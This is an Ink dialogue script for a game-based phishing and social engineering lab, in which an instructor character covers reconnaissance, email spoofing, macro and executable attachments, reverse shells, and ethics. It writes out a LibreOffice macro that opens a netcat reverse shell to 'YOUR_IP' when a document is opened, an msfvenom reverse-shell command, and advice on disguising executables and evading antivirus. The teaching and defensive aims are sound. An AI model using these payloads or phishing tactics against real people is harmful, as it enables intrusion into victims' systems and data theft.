// ===========================================
// PHISHING AND SOCIAL ENGINEERING LAB
// Human Factors and Social Engineering
// ===========================================
// Game-Based Learning replacement for lab sheet
// Original: cyber_security_landscape/3_phishing.md
// ===========================================

// Progress tracking
VAR intro_human_factors_discussed = false
VAR phishing_basics_discussed = false
VAR reconnaissance_discussed = false
VAR email_spoofing_discussed = false
VAR malicious_attachments_discussed = false
VAR macros_discussed = false
VAR executables_discussed = false
VAR reverse_shells_discussed = false
VAR ethics_discussed = false

// Detailed topics
VAR weakest_link_discussed = false
VAR spear_phishing_discussed = false
VAR attachment_types_discussed = false
VAR macro_creation_discussed = false
VAR msfvenom_discussed = false
VAR netcat_listener_discussed = false

// Challenge tracking
VAR completed_reconnaissance = false
VAR completed_first_phish = false
VAR completed_spoofing = false
VAR completed_attachment = false

// Instructor relationship
VAR instructor_rapport = 0
VAR ethical_awareness_shown = false

// External variables
EXTERNAL player_name

// ===========================================
// ENTRY POINT - SOCIAL ENGINEERING SPECIALIST
// ===========================================

=== start ===
~ instructor_rapport = 0

Social Engineering Specialist: Welcome, Agent {player_name}. I'm your instructor for human factors and social engineering.

Social Engineering Specialist: This module covers a critical truth: the human element is often the most exploitable component of any security system. Technical defenses don't matter if an attacker can convince a user to bypass them.

Social Engineering Specialist: Before we begin—this training covers offensive techniques. Everything we discuss is for authorized security testing within controlled environments. These skills exist to help organizations identify and remediate human vulnerabilities.

Social Engineering Specialist: Clear on that? We're learning these techniques to defend against them, and to conduct authorized penetration tests.

* [Absolutely. I understand the ethical boundaries]
    ~ ethical_awareness_shown = true
    ~ instructor_rapport += 15
    You: Understood completely. Authorized testing only, controlled environments, defensive purpose.
    Social Engineering Specialist: Perfect. That's exactly the mindset we need. Let's begin.
    -> social_engineering_hub
* [Yes, I'm clear on the scope]
    ~ instructor_rapport += 5
    You: Clear on the ethical constraints.
    Social Engineering Specialist: Good. Remember that throughout.
    -> social_engineering_hub

// ===========================================
// MAIN TRAINING HUB
// ===========================================

=== social_engineering_hub ===

Social Engineering Specialist: What aspect of social engineering and phishing would you like to cover?

+ {not intro_human_factors_discussed} [Human factors in cybersecurity]
    -> human_factors_intro
+ {not phishing_basics_discussed} [Phishing attack fundamentals]
    -> phishing_basics
+ {not reconnaissance_discussed} [Reconnaissance and information gathering]
    -> reconnaissance_intro
+ {not email_spoofing_discussed} [Email spoofing techniques]
    -> email_spoofing_intro
+ {not malicious_attachments_discussed} [Creating malicious attachments]
    -> malicious_attachments_intro
+ {not reverse_shells_discussed} [Reverse shells and remote access]
    -> reverse_shells_intro
+ {phishing_basics_discussed and malicious_attachments_discussed} [Show me the attack workflow]
    -> attack_workflow
+ {ethics_discussed or ethical_awareness_shown} [Practical challenge tips]
    -> challenge_tips
+ {not ethics_discussed} [Ethical considerations and defensive applications]
    -> ethics_discussion
+ [I'm ready to start the simulation]
    -> ready_for_simulation
+ [That's all for now]
    -> end_session

// ===========================================
// HUMAN FACTORS IN CYBERSECURITY
// ===========================================

=== human_factors_intro ===
~ intro_human_factors_discussed = true
~ instructor_rapport += 5

Social Engineering Specialist: Human factors. The foundation of social engineering attacks.

Social Engineering Specialist: Technical security can be excellent—strong encryption, patched systems, robust firewalls. But all of that can be bypassed if you can convince a human to let you in.

Social Engineering Specialist: Users have mental models of security and risk. Attackers exploit gaps between those models and reality. If a user doesn't perceive danger, they won't apply security measures.

Social Engineering Specialist: The classic saying: "The user is the weakest link." It's true, but also incomplete. Users aren't inherently weak—they're often inadequately trained, using poorly designed security systems, under time pressure, making snap decisions.

* [Why do humans fall for these attacks?]
    ~ weakest_link_discussed = true
    You: What makes humans so vulnerable to social engineering?
    -> human_vulnerabilities
* [How do we defend against this?]
    You: If humans are vulnerable, how do we protect systems?
    -> human_factors_defense
* [I see—target the human, not the system]
    -> social_engineering_hub

=== human_vulnerabilities ===
~ instructor_rapport += 10

Social Engineering Specialist: Excellent question. Multiple factors make humans vulnerable:

Social Engineering Specialist: **Psychology**: Humans are wired for trust and helpfulness. We want to assist others. Attackers exploit that.

Social Engineering Specialist: **Cognitive biases**: Authority bias makes us trust official-looking messages. Urgency causes us to skip security checks. Curiosity makes us click suspicious links.

Social Engineering Specialist: **Complexity**: Security systems are often complicated and user-hostile. When security gets in the way of work, users find workarounds.

Social Engineering Specialist: **Information asymmetry**: Attackers know tricks users don't. A well-crafted phishing email can be nearly indistinguishable from legitimate correspondence.

Social Engineering Specialist: **Scale**: Attackers can send thousands of phishing emails. They only need one person to click. The defender has to get it right every time.

~ instructor_rapport += 5
-> social_engineering_hub

=== human_factors_defense ===
~ instructor_rapport += 10

Social Engineering Specialist: Good instinct. Defense requires layered approaches:

Social Engineering Specialist: **Security awareness training**: Educate users about phishing indicators, social engineering tactics, and safe behaviors. Make them part of the defense.

Social Engineering Specialist: **Usable security**: Design security systems that are intuitive and don't obstruct legitimate work. Security that's too burdensome will be circumvented.

Social Engineering Specialist: **Technical controls**: Email filtering, attachment sandboxing, multi-factor authentication. Don't rely solely on human vigilance.

Social Engineering Specialist: **Culture**: Create organizational culture where questioning suspicious requests is encouraged, not punished. Users should feel safe reporting potential phishing.

Social Engineering Specialist: **Regular testing**: Conduct simulated phishing campaigns to identify vulnerable users and improve training. What we're doing here—authorized, controlled testing.

~ instructor_rapport += 10
-> social_engineering_hub

// ===========================================
// PHISHING BASICS
// ===========================================

=== phishing_basics ===
~ phishing_basics_discussed = true
~ instructor_rapport += 5

Social Engineering Specialist: Phishing. One of the most effective attack vectors in cybersecurity.

Social Engineering Specialist: Phishing is social engineering via electronic communication—typically email. The attacker crafts a message designed to trick the recipient into:
- Revealing sensitive information (credentials, financial data)
- Clicking malicious links (web attacks, credential harvesting)
- Opening malicious attachments (malware installation)

Social Engineering Specialist: This lab focuses on the attachment vector. Getting a victim to execute malicious code by opening a document or program.

Social Engineering Specialist: Once they open that attachment, the attacker gains access to their system. From there: data theft, lateral movement, persistent access.

* [Tell me about spear phishing]
    ~ spear_phishing_discussed = true
    You: What's the difference between phishing and spear phishing?
    -> spear_phishing_explanation
* [How successful are phishing attacks?]
    You: Do these attacks actually work in practice?
    -> phishing_success_rates
* [What makes a phishing email convincing?]
    You: How do attackers make emails look legitimate?
    -> convincing_phishing
* [Understood]
    -> social_engineering_hub

=== spear_phishing_explanation ===
~ instructor_rapport += 10

Social Engineering Specialist: Important distinction.

Social Engineering Specialist: **Phishing**: Broad, untargeted attacks. Send millions of generic emails, hope a small percentage responds. Spray and pray approach.

Social Engineering Specialist: **Spear phishing**: Targeted attacks against specific individuals or organizations. Attacker researches the target, customizes the message, references real information.

Social Engineering Specialist: Spear phishing is dramatically more effective. When an email mentions your colleague by name, references a real project, comes from what appears to be a trusted source—much harder to detect.

Social Engineering Specialist: This lab simulates spear phishing. You'll research targets, craft personalized messages, exploit relationships and trust.

Social Engineering Specialist: In real-world APT (Advanced Persistent Threat) attacks, spear phishing is often the initial compromise. High-value targets get carefully researched, precisely targeted emails.

~ instructor_rapport += 10
-> social_engineering_hub

=== phishing_success_rates ===
~ instructor_rapport += 8

Social Engineering Specialist: Disturbingly successful.

Social Engineering Specialist: Industry studies show phishing success rates vary widely, but typical ranges:
- 10-30% of recipients open phishing emails
- 5-15% click malicious links or open attachments
- Even with training, 2-5% still fall for sophisticated phishing

Social Engineering Specialist: That might sound low, but in an organization with 1000 employees, that's 20-50 successful compromises from a single campaign.

Social Engineering Specialist: Spear phishing success rates are much higher—30-45% click rates are common. Highly personalized attacks can achieve 60%+ success.

Social Engineering Specialist: The economics favor attackers: sending 10,000 phishing emails costs nearly nothing. Even 1% success is profitable.

Social Engineering Specialist: And one successful compromise can be enough. One executive's email account, one developer's credentials, one system admin's access—that's your foothold.

~ instructor_rapport += 8
-> social_engineering_hub

=== convincing_phishing ===
~ instructor_rapport += 10

Social Engineering Specialist: The art of the convincing phish. Several key elements:

Social Engineering Specialist: **Legitimate-looking sender**: Spoofed email addresses from trusted domains. We'll cover technical spoofing shortly.

Social Engineering Specialist: **Personalization**: Use target's name, reference their role, mention real colleagues or projects.

Social Engineering Specialist: **Context and pretext**: Create plausible reason for contact. "Financial report for review," "urgent HR policy update," "document you requested."

Social Engineering Specialist: **Professional presentation**: Proper grammar, corporate branding, official-looking signatures. Amateur phishing is easy to spot—professional phishing is not.

Social Engineering Specialist: **Appropriate attachments**: Send document types the target would expect to receive. Accountants get spreadsheets, lawyers get legal documents, designers get graphics.

Social Engineering Specialist: **Psychological triggers**: Authority (from executive), urgency (immediate action needed), fear (account suspended), curiosity (confidential information).

Social Engineering Specialist: Combine these elements, and you create emails that even security-aware users might trust.

~ instructor_rapport += 10
-> social_engineering_hub

// ===========================================
// RECONNAISSANCE
// ===========================================

=== reconnaissance_intro ===
~ reconnaissance_discussed = true
~ instructor_rapport += 5

Social Engineering Specialist: Reconnaissance. The foundation of targeted attacks.

Social Engineering Specialist: Before crafting phishing emails, you need intelligence: employee names, email addresses, roles, relationships, interests.

Social Engineering Specialist: In this simulation, you'll browse a target organization's website. In real operations, reconnaissance is much broader:

Social Engineering Specialist: **OSINT (Open Source Intelligence)**: LinkedIn profiles, company websites, social media, press releases, job postings, conference presentations.

Social Engineering Specialist: **Email pattern analysis**: Most organizations follow predictable patterns. firstname.lastname@company.com, flastname@company.com, etc.

Social Engineering Specialist: **Relationship mapping**: Who works with whom? Who reports to whom? Who's friends outside work?

Social Engineering Specialist: **Interest identification**: What are targets passionate about? Sports teams, hobbies, causes? These can be social engineering hooks.

* [How much reconnaissance is typical?]
    You: How long do attackers spend on reconnaissance?
    -> recon_timeframes
* [What tools help with OSINT?]
    You: Are there tools that automate information gathering?
    -> osint_tools
* [Got it—gather intelligence first]
    ~ completed_reconnaissance = true
    -> social_engineering_hub

=== recon_timeframes ===
~ instructor_rapport += 8

Social Engineering Specialist: Depends on the operation and target value.

Social Engineering Specialist: **Opportunistic attacks**: Minimal reconnaissance. Attacker identifies employee email addresses and sends generic phishing. Hours or less.

Social Engineering Specialist: **Targeted campaigns**: Days to weeks. Research key employees, understand organizational structure, identify high-value targets.

Social Engineering Specialist: **APT operations**: Months. Nation-state actors conducting espionage might spend extensive time profiling targets, mapping networks, planning multi-stage operations.

Social Engineering Specialist: The more valuable the target, the more reconnaissance is justified. Compromising a Fortune 500 CEO's email? Weeks of careful research is worthwhile.

Social Engineering Specialist: For this lab, you'll spend 15-30 minutes on reconnaissance. Enough to understand the organization and personalize attacks, but compressed for training purposes.

~ instructor_rapport += 5
~ completed_reconnaissance = true
-> social_engineering_hub

=== osint_tools ===
~ instructor_rapport += 10

Social Engineering Specialist: Many tools assist OSINT:

Social Engineering Specialist: **theHarvester**: Scrapes search engines, social media for email addresses and names associated with a domain.

Social Engineering Specialist: **Maltego**: Visual link analysis. Maps relationships between people, companies, domains, infrastructure.

Social Engineering Specialist: **recon-ng**: Framework for web reconnaissance. Modules for gathering information from various sources.

Social Engineering Specialist: **SpiderFoot**: Automated OSINT gathering from 100+ sources.

Social Engineering Specialist: **LinkedIn, Facebook, Twitter**: Directly browsing social media often reveals extensive information. People share surprising amounts publicly.

Social Engineering Specialist: **Google dorking**: Advanced search operators to find exposed information. site:target.com filetype:pdf reveals documents, for example.

Social Engineering Specialist: **Shodan**: Search engine for internet-connected devices. Find exposed services and infrastructure.

Social Engineering Specialist: For this exercise, you'll manually browse the target website. Simple, but effective for understanding the process.

~ instructor_rapport += 10
~ completed_reconnaissance = true
-> social_engineering_hub

// ===========================================
// EMAIL SPOOFING
// ===========================================

=== email_spoofing_intro ===
~ email_spoofing_discussed = true
~ instructor_rapport += 5

Social Engineering Specialist: Email spoofing. Fundamental to convincing phishing.

Social Engineering Specialist: Email protocols (SMTP) have a critical flaw: the "From" address is not authenticated. You can claim to be anyone.

Social Engineering Specialist: When you send an email, you specify the sender address. Nothing inherently prevents you from specifying someone else's address.

Social Engineering Specialist: This is why phishing can appear to come from trusted sources—colleagues, executives, IT departments, banks.

Social Engineering Specialist: Modern defenses exist: SPF, DKIM, DMARC—technologies that authenticate sender domains. But implementation is inconsistent, and many organizations haven't deployed them properly.

* [Tell me about SPF/DKIM/DMARC]
    You: How do those authentication technologies work?
    -> email_authentication
* [How do I spoof emails in this lab?]
    You: What's the technique for spoofing sender addresses?
    -> spoofing_technique
* [Why hasn't this been fixed?]
    You: If this is a known problem, why hasn't email been redesigned?
    -> email_design_problems
* [Understood—email spoofing is possible]
    ~ completed_spoofing = true
    -> social_engineering_hub

=== email_authentication ===
~ instructor_rapport += 10

Social Engineering Specialist: Good question. Email authentication mechanisms:

Social Engineering Specialist: **SPF (Sender Policy Framework)**: DNS record specifying which mail servers are authorized to send email for a domain. Receiving servers check if email came from authorized server.

Social Engineering Specialist: **DKIM (DomainKeys Identified Mail)**: Cryptographic signature attached to emails. Proves email wasn't modified in transit and came from declared domain.

Social Engineering Specialist: **DMARC (Domain-based Message Authentication, Reporting, Conformance)**: Policy framework built on SPF and DKIM. Tells receiving servers what to do with emails that fail authentication—reject, quarantine, or accept with warning.

Social Engineering Specialist: When properly implemented, these make spoofing much harder. But "properly implemented" is key.

Social Engineering Specialist: Many organizations haven't configured DMARC. Many email servers don't strictly enforce these policies. Spoofing remains viable in many scenarios.

~ instructor_rapport += 10
-> social_engineering_hub

=== spoofing_technique ===
~ instructor_rapport += 8

Social Engineering Specialist: In this lab, spoofing is straightforward.

Social Engineering Specialist: In Thunderbird email client, you can customize the "From" address. Click the dropdown next to your address, select "Customize From Address," and enter whatever you want.

Social Engineering Specialist: In the simulation, this works seamlessly—no authentication checks. In real environments, spoofing might be blocked by email server policies or recipient filtering.

Social Engineering Specialist: Other spoofing approaches:
- Using SMTP directly with telnet or specialized tools
- Configuring mail servers with fake sender information
- Exploiting misconfigured email servers that don't require authentication

Social Engineering Specialist: The simulation simplifies this to focus on social engineering tactics rather than technical bypasses.

~ completed_spoofing = true
~ instructor_rapport += 5
-> social_engineering_hub

=== email_design_problems ===
~ instructor_rapport += 10

Social Engineering Specialist: Excellent critical thinking.

Social Engineering Specialist: Email protocols date to early internet days—1980s SMTP. Security wasn't a primary concern. Ease of use and interoperability were priorities.

Social Engineering Specialist: Redesigning email faces massive challenges:
- **Legacy compatibility**: Billions of systems rely on existing protocols
- **Decentralization**: Email has no central authority to enforce changes
- **Deployment inertia**: Organizations resist upgrading working systems
- **Complexity**: Cryptographic authentication adds complexity users might not understand

Social Engineering Specialist: SPF/DKIM/DMARC are retrofit solutions—adding authentication to existing protocols. They work, but require universal adoption to be fully effective.

Social Engineering Specialist: Classic security challenge: replacing widely-deployed insecure systems is incredibly difficult, even when better alternatives exist.

Social Engineering Specialist: Lesson: technical debt and legacy systems create enduring vulnerabilities. Design security in from the start, because retrofitting is painful.

~ instructor_rapport += 15
-> social_engineering_hub

// ===========================================
// MALICIOUS ATTACHMENTS
// ===========================================

=== malicious_attachments_intro ===
~ malicious_attachments_discussed = true
~ instructor_rapport += 5

Social Engineering Specialist: Malicious attachments. The payload delivery mechanism.

Social Engineering Specialist: Once you've crafted a convincing phishing email, you need a malicious attachment that compromises the target's system when opened.

Social Engineering Specialist: Three main types we'll cover:
1. **Executable programs**: Compiled malware that runs directly
2. **Office documents with macros**: Word/Excel/LibreOffice files containing malicious scripts
3. **Exploit documents**: Files that exploit vulnerabilities in document readers

Social Engineering Specialist: The choice depends on your target. Different roles expect different file types.

* [Tell me about choosing appropriate attachment types]
    ~ attachment_types_discussed = true
    You: How do I match attachments to targets?
    -> attachment_targeting
* [Explain macros in documents]
    You: How do office macros work as attack vectors?
    -> macro_explanation
* [Show me executable payloads]
    You: What about standalone malware programs?
    -> executable_payloads
* [I understand the options]
    -> social_engineering_hub

=== attachment_targeting ===
~ instructor_rapport += 10

Social Engineering Specialist: Matching attachments to targets—critical for success.

Social Engineering Specialist: **Accountants and finance**: Expect spreadsheets. LibreOffice Calc (.ods) or Excel (.xlsx) with macros. "Quarterly report," "budget analysis," "expense tracking."

Social Engineering Specialist: **Executives and managers**: Might receive various documents. Word documents (.docx, .odt) with "strategic plan," "board presentation," "confidential memo."

Social Engineering Specialist: **IT and technical staff**: Might be suspicious of documents, but could receive scripts, logs, or technical reports. Executable tools less suspicious to technical users.

Social Engineering Specialist: **HR departments**: Resumes, applications, employee documents. Word documents or PDFs.

Social Engineering Specialist: **General principle**: Send what the target expects to receive in their role. Accountants opening unexpected executables? Suspicious. Accountants opening financial spreadsheets? Routine.

Social Engineering Specialist: In this simulation, targets have preferences. Some will only open specific file types. Pay attention to their roles and feedback.

~ instructor_rapport += 10
~ completed_attachment = true
-> social_engineering_hub

=== macro_explanation ===
~ macros_discussed = true
~ instructor_rapport += 5

Social Engineering Specialist: Office macros. Powerful and frequently exploited.

Social Engineering Specialist: Macros are scripts embedded in office documents—Microsoft Office or LibreOffice. Originally designed for automating document tasks: calculations, formatting, data processing.

Social Engineering Specialist: Macro languages (Visual Basic for Applications in MS Office, LibreOffice Basic) are full programming languages. They can:
- Execute system commands
- Access files and network resources
- Download and run additional malware
- Steal data

Social Engineering Specialist: Modern office software warns users about macros. But many users click "Enable Macros" without understanding the risk—especially if the document looks legitimate and they expect to receive it.

Social Engineering Specialist: Social engineering comes into play: "This document contains macros required to view the content. Please enable macros to continue."

* [How do I create a malicious macro?]
    ~ macro_creation_discussed = true
    You: Walk me through creating a macro payload.
    -> macro_creation
* [What defenses exist against macro malware?]
    You: How do organizations protect against malicious macros?
    -> macro_defenses
* [Got the concept]
    -> social_engineering_hub

=== macro_creation ===
~ instructor_rapport += 10

Social Engineering Specialist: Creating a malicious macro—walkthrough:

Social Engineering Specialist: **Step 1**: Open LibreOffice Writer or Calc. Tools → Macros → Organize Macros → Basic.

Social Engineering Specialist: **Step 2**: Create new macro in your document. Click document name, click "New."

Social Engineering Specialist: **Step 3**: Write the macro code. Example using Shell command to execute system commands:

Social Engineering Specialist: `Sub Main
  Shell("/bin/nc", vbNormalFocus, "-e /bin/sh YOUR_IP 8080")
End Sub`

Social Engineering Specialist: This creates a reverse shell—connects back to your system with command line access.

Social Engineering Specialist: **Step 4**: Configure macro to run on document open. Tools → Customize → Events → Open Document → Macro → select your macro.

Social Engineering Specialist: **Step 5**: Add convincing content to document. Financial data, corporate memo, whatever fits your pretext.

Social Engineering Specialist: **Step 6**: Save as .odt or .ods. Attach to phishing email.

Social Engineering Specialist: When victim opens document and enables macros (or if their security is set to low), your payload executes.

~ instructor_rapport += 10
~ completed_attachment = true
-> social_engineering_hub

=== macro_defenses ===
~ instructor_rapport += 10

Social Engineering Specialist: Macro defenses—layered approach:

Social Engineering Specialist: **Technical controls:**
- Disable macros by default (most modern office software does this)
- Block macros from internet-sourced documents
- Application whitelisting—only approved programs can execute
- Email gateway scanning for malicious macros

Social Engineering Specialist: **User training:**
- Educate users never to enable macros in unexpected documents
- Teach users to verify sender through out-of-band communication
- Create culture where users question suspicious documents

Social Engineering Specialist: **Policy enforcement:**
- Organizational policies prohibiting macro usage except for approved documents
- Removal of macro execution capabilities from standard user systems
- Require code signing for legitimate macros

Social Engineering Specialist: The challenge: many organizations legitimately use macros for business processes. Completely blocking them disrupts workflow. Balance between usability and security.

Social Engineering Specialist: Defense-in-depth: combine technical controls, user awareness, and policy. No single measure is perfect.

~ instructor_rapport += 10
-> social_engineering_hub

=== executable_payloads ===
~ instructor_rapport += 5

Social Engineering Specialist: Executable malware payloads. More direct than macros.

Social Engineering Specialist: Standalone programs that run malicious code when executed. Typically ELF binaries on Linux, EXE on Windows.

Social Engineering Specialist: Advantage: No need for user to enable macros. If they run the file, it executes.

Social Engineering Specialist: Disadvantage: More obviously suspicious. Users might question why they're being sent a program rather than a document.

Social Engineering Specialist: Works better with technical targets who might expect to receive tools, scripts, or utilities.

* [How do I create an executable payload?]
    ~ msfvenom_discussed = true
    You: What tools create malicious executables?
    -> msfvenom_payloads
* [How do attackers disguise executables?]
    You: How do you make executables look legitimate?
    -> executable_disguises
* [Understood]
    -> social_engineering_hub

=== msfvenom_payloads ===
~ instructor_rapport += 10

Social Engineering Specialist: msfvenom. Metasploit Framework's payload generator.

Social Engineering Specialist: Creates standalone payloads for various platforms. For Linux targets:

Social Engineering Specialist: `msfvenom -a x64 --platform linux -p linux/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o malware`

Social Engineering Specialist: Breaking this down:
- `-a x64` — architecture (64-bit)
- `--platform linux` — target OS
- `-p linux/x64/shell_reverse_tcp` — payload type (reverse shell)
- `LHOST=YOUR_IP` — your IP for callback
- `LPORT=4444` — your listening port
- `-f elf` — output format (Linux executable)
- `-o malware` — output filename

Social Engineering Specialist: Before sending, set up listener to receive connection:
`nc -lvvp 4444`

Social Engineering Specialist: When victim runs the malware, it connects back to you. You get command line access to their system.

Social Engineering Specialist: msfvenom can generate payloads for any platform, architecture, and access method. Incredibly versatile tool.

~ instructor_rapport += 10
~ completed_attachment = true
-> social_engineering_hub

=== executable_disguises ===
~ instructor_rapport += 8

Social Engineering Specialist: Disguising executables—social engineering and technical tricks:

Social Engineering Specialist: **Naming**: Use document-like names. "Financial_Report.pdf.exe" (exploiting hidden file extensions on Windows). On Linux: "report.sh" looks like a script, more plausible than random binary.

Social Engineering Specialist: **Icons**: Change executable icon to document icon. Makes files appear to be documents visually.

Social Engineering Specialist: **Packers and crypters**: Obfuscate executable code to avoid antivirus detection. Tools like UPX, custom packers.

Social Engineering Specialist: **Legitimate tool abuse**: Package malicious code with legitimate software. "Install this tool to view the document."

Social Engineering Specialist: **Pretext engineering**: Convince target they need to run the program. "Security update," "codec required," "validation tool."

Social Engineering Specialist: In practice, getting users to run raw executables is harder than macro documents. But with right pretext and target, it works.

~ instructor_rapport += 8
-> social_engineering_hub

// ===========================================
// REVERSE SHELLS
// ===========================================

=== reverse_shells_intro ===
~ reverse_shells_discussed = true
~ instructor_rapport += 5

Social Engineering Specialist: Reverse shells. The goal of attachment-based phishing.

Social Engineering Specialist: **Normal shell**: You connect TO a remote system. You initiate the connection.

Social Engineering Specialist: **Reverse shell**: Remote system connects TO you. Victim's machine initiates the connection.

Social Engineering Specialist: Why reverse? Several advantages:
- Bypasses firewalls (outbound connections usually allowed, inbound blocked)
- No need for victim to have open ports
- Works from behind NAT
- Victim's actions trigger connection

* [How do reverse shells work technically?]
    ~ netcat_listener_discussed = true
    You: Explain the technical mechanism.
    -> reverse_shell_mechanics
* [What can I do with remote shell access?]
    You: Once I have a shell, what's next?
    -> post_exploitation_basics
* [Understood the concept]
    -> social_engineering_hub

=== reverse_shell_mechanics ===
~ instructor_rapport += 10

Social Engineering Specialist: Reverse shell mechanics—simple but elegant:

Social Engineering Specialist: **Your system (attacker)**:
Set up listener waiting for connections:
`nc -lvvp 4444`

This listens on port 4444. When victim connects, you get their command line.

Social Engineering Specialist: **Victim's system**:
Malicious payload runs, connecting back to you:
`nc -e /bin/sh YOUR_IP 4444`

Or embedded in macro, executable, whatever payload you delivered.

Social Engineering Specialist: **Result**:
Victim's machine makes outbound connection to your IP:4444. Your listener accepts connection. You now type commands that execute on victim's system.

Social Engineering Specialist: **Network perspective**:
From network monitoring, looks like victim initiated connection to external IP. Harder to distinguish from legitimate traffic than inbound connection to victim.

Social Engineering Specialist: Tools like netcat, msfvenom payloads, custom scripts—all create reverse shell connections.

~ instructor_rapport += 10
-> social_engineering_hub

=== post_exploitation_basics ===
~ instructor_rapport += 10

Social Engineering Specialist: Post-exploitation. What you do after gaining access.

Social Engineering Specialist: **Initial assessment**:
- `whoami` — what user are you?
- `pwd` — where are you in filesystem?
- `ls -la` — what's in current directory?
- `uname -a` — system information

Social Engineering Specialist: **Objective completion**:
For this lab: read flag files in home directories. In real operations: depends on goals.

Social Engineering Specialist: **Common post-exploitation actions**:
- Privilege escalation (gain root/admin access)
- Lateral movement (compromise additional systems)
- Data exfiltration (steal information)
- Persistence (maintain access for future use)
- Covering tracks (delete logs, hide presence)

Social Engineering Specialist: **Limitations of simple shells**:
Basic netcat shells are fragile—no TTY, limited interaction, easily disconnected. Advanced: upgrade to Meterpreter, SSH tunnel, or other robust access methods.

Social Engineering Specialist: For this lab, simple shell is sufficient to read flags and demonstrate access.

~ instructor_rapport += 10
-> social_engineering_hub

// ===========================================
// ATTACK WORKFLOW
// ===========================================

=== attack_workflow ===
~ instructor_rapport += 5

Social Engineering Specialist: Complete attack workflow for this lab:

Social Engineering Specialist: **Phase 1 - Reconnaissance**:
- Browse target organization website (accountingnow.com)
- Document employee names, email addresses, roles
- Note potential interests, relationships

Social Engineering Specialist: **Phase 2 - Payload Preparation**:
- Set up netcat listener: `nc -lvvp 4444` or `nc -lvvp 8080`
- Create malicious attachment:
  * Macro document (LibreOffice with Shell command)
  * Executable payload (msfvenom)
- Match payload type to target role

Social Engineering Specialist: **Phase 3 - Email Crafting**:
- Compose phishing email in Thunderbird
- Spoof sender to trusted source (colleague, manager)
- Personalize content (use target's name, reference their role)
- Create plausible pretext for attachment
- Attach malicious file

Social Engineering Specialist: **Phase 4 - Engagement**:
- Send email
- Monitor for replies (simulation provides feedback)
- Refine approach based on victim responses
- Iterate until victim opens attachment

Social Engineering Specialist: **Phase 5 - Exploitation**:
- Victim opens attachment, payload executes
- Reverse shell connects to your listener
- You gain remote access

Social Engineering Specialist: **Phase 6 - Objective**:
- Navigate filesystem: `ls -la`, `cd /home/victim`
- Read flag files: `cat flag`
- Submit flags to prove success

+ [Back to main menu]
    -> social_engineering_hub

// ===========================================
// CHALLENGE TIPS
// ===========================================

=== challenge_tips ===
~ instructor_rapport += 5

Social Engineering Specialist: Practical tips for the simulation:

Social Engineering Specialist: **Reconnaissance tips**:
- Explore every page on accountingnow.com
- Note employee roles—finance, management, IT, etc.
- Look for names mentioned in multiple places (relationships)

Social Engineering Specialist: **Email crafting tips**:
- Pay attention to victim feedback—they tell you what's wrong
- Use names (theirs and colleagues') in messages
- Spoof sender to someone they'd trust
- Create urgency or authority without being obvious

Social Engineering Specialist: **Technical tips**:
- Start netcat listener BEFORE sending email
- For macros: ensure victim's security is set to allow execution
- Be patient—LibreOffice can take 1-2 minutes to launch
- If connection fails, check IP addresses and ports

Social Engineering Specialist: **Payload selection**:
- Finance/accounting: spreadsheets (.ods with macros)
- Management: documents (.odt with macros)
- Technical roles: might accept executables
- Experiment if initial attachment type fails

Social Engineering Specialist: **Shell usage**:
- Simple commands only in basic reverse shells
- `ls -la` to list files
- `cat filename` to read files
- `pwd` to check location
- Flags are in victim home directories

Social Engineering Specialist: **Troubleshooting**:
- No connection? Verify listener running and victim opened file
- No victim response? Check email content against feedback
- Permission denied? You're limited to victim's user permissions

+ [Back to main menu]
    -> social_engineering_hub

// ===========================================
// ETHICS DISCUSSION
// ===========================================

=== ethics_discussion ===
~ ethics_discussed = true
~ instructor_rapport += 10

Social Engineering Specialist: Critical topic. Ethical considerations.

Social Engineering Specialist: The techniques you're learning are powerful and potentially harmful. Let's be absolutely clear about ethical boundaries:

Social Engineering Specialist: **Authorized testing only**: Everything we've covered is for authorized penetration testing within controlled environments. Using these techniques against systems you don't have explicit written permission to test is illegal—computer fraud, unauthorized access, potential felony charges.

Social Engineering Specialist: **Simulation vs reality**: This lab is a controlled simulation. Victims are non-existent. In real penetration tests, you're testing real employees with real systems, under contract, with defined scope.

Social Engineering Specialist: **Defensive purpose**: You're learning these techniques to:
- Conduct authorized security assessments
- Understand attacker methods to build defenses
- Train others in recognizing social engineering
- Improve organizational security posture

Social Engineering Specialist: **Professional responsibility**: Security professionals must operate ethically. Our field requires trust. Abuse these skills and you damage the entire profession.

* [What about "ethical hacking" justifications?]
    ~ ethical_awareness_shown = true
    You: I've heard people justify unauthorized testing as "ethical hacking" to help organizations.
    -> ethical_hacking_discussion
* [How do legitimate penetration tests work?]
    You: How does authorized testing differ from what we're practicing?
    -> pentest_process
* [I understand the ethical boundaries]
    ~ ethical_awareness_shown = true
    You: Clear on the ethics. Authorized testing, defensive purpose, professional responsibility.
    Social Engineering Specialist: Excellent. Remember that throughout your career.
    ~ instructor_rapport += 15
    -> social_engineering_hub

=== ethical_hacking_discussion ===
~ instructor_rapport += 15

Social Engineering Specialist: "Ethical hacking" without authorization is a contradiction.

Social Engineering Specialist: Some people justify unauthorized penetration testing as "helping" organizations by exposing vulnerabilities. This is wrong on multiple levels:

Social Engineering Specialist: **Legally**: Unauthorized access is illegal, regardless of intent. "I was trying to help" is not a legal defense. You can be prosecuted.

Social Engineering Specialist: **Ethically**: You're making decisions about acceptable risk for someone else's systems without their consent. Not your choice to make.

Social Engineering Specialist: **Practically**: Penetration testing can cause disruptions, trigger incident responses, waste security team resources. Unauthorized testing creates real costs.

Social Engineering Specialist: **Professionally**: It demonstrates poor judgment and lack of integrity. Organizations won't hire security professionals who've demonstrated willingness to break rules.

Social Engineering Specialist: **Proper approach**: If you identify a vulnerability, responsible disclosure. Report it to the organization through appropriate channels (security contact, bug bounty program). Let them decide how to handle it.

Social Engineering Specialist: The distinction is consent. Authorized testing with consent is ethical. Unauthorized testing without consent is not—even with "good intentions."

~ instructor_rapport += 20
-> social_engineering_hub

=== pentest_process ===
~ instructor_rapport += 15

Social Engineering Specialist: Legitimate penetration testing process:

Social Engineering Specialist: **Engagement and contracting**:
- Client requests penetration test
- Scope is defined: which systems, which methods, what's off-limits
- Contract specifies deliverables, timeline, liability
- Written authorization provided
- Emergency contacts established

Social Engineering Specialist: **Rules of engagement**:
- Testing windows (when testing is permitted)
- Prohibited actions (don't DOS production systems, don't access sensitive data types)
- Notification procedures (how to report critical findings immediately)
- Legal protections and authorizations

Social Engineering Specialist: **Execution**:
- Testing conducted within agreed scope
- Documentation of all actions
- Communication with client contact
- Immediate reporting of critical vulnerabilities

Social Engineering Specialist: **Reporting**:
- Comprehensive report of findings
- Risk ratings and remediation recommendations
- Executive summary for leadership
